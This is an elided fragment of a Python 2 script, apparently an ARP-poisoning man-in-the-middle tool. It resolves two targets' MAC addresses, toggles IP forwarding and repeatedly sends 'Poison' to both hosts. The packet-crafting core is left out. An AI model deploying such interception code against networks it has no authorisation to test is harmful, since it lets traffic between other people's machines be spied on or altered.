...
if __name__ == '__main__':
	...
	parser.add_argument('--time', help='Track attack duration', action='store_true', dest='time', default=False)
	...
	print c+'[*]'+w+' Resolving Target Addresses...',; sys.stdout.flush()
	try:
		MACs = map(lambda x: PreAttack(x, args.interface).get_MAC_Addr(), targets)
		print g+'[DONE]'
	except Exception:
		print r+'[!]'+w+' Failed to Resolve Target Address'
		sys.exit(1)
	try:
		if args.forward:
			print c+'[*]'+w+' Enabling IP Forwarding...',; sys.stdout.flush()
			PreAttack.toggle_IP_Forward().enable_IP_Forward()
			print g+'[DONE]'
	except IOError:
		print r+'[FAIL]'
		try:
			choice = raw_input(y+'[*]'+w+' Proceed with Attack? [y/N] ').strip().lower()[0]
			if choice == 'y':
				pass
			elif choice == 'n':
				print r+'[!]'+w+' User Cancelled Attack'
				sys.exit(1)
			else:
				print r+'[!]'+w+' Invalid Choice'
				sys.exit(1)
	...
	while 1:
		try:
			try:
				...
				sys.exit(1)
			if not args.quiet:
				print g+'[*]'+w+'Poison Sent to %s and %s' %(targets[0], targets[1])
			else:
				pass
			pause(2.5)
		except KeyboardInterrupt:
	...
	try:
		if args.forward:
			print c+'[*]'+w+' Disabling IP Forwarding...',; sys.stdout.flush()
			PreAttack.toggle_IP_Forward().disable_IP_Forward()
			print g+'[DONE]'
	except IOError:
		print r+'[FAIL]'
	if args.time:
		print g+'[*]'+w+' Attack Duration: %s' %(datetime.now() - start_Time)